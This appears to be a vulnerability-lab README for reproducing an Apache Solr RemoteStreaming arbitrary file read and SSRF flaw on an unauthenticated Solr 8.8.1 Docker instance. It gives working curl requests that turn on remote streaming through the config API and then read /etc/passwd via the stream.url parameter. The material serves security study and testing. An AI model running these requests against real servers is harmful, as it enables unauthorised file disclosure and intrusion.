# Apache Solr RemoteStreaming Arbitrary File Reading and SSRF

[中文版本(Chinese version)](README.zh-cn.md)

Apache Solr is an open-source search server. When Apache Solr does not have authentication enabled, an attacker can craft a request to enable specific configurations, potentially leading to Server-Side Request Forgery (SSRF) or arbitrary file reading vulnerabilities.

References:

- <https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ>

## Environment Setup

Execute the following command to start an Apache Solr 8.8.1 server:

```
docker compose up -d
```

After the server starts, you can access the Apache Solr management interface at `http://your-ip:8983/`.

## Vulnerability Reproduction

First, visit `http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json` to extract the database name:

![](1.png)

Send the following request to modify the configuration of the `demo` core and enable `RemoteStreaming`:

```
curl -i -s -k -X $'POST' \
     -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
     $'http://your-ip:8983/solr/demo/config'
```

![](2.png)

Then, you can read arbitrary files through the `stream.url` parameter:

```
curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```

![](3.png)
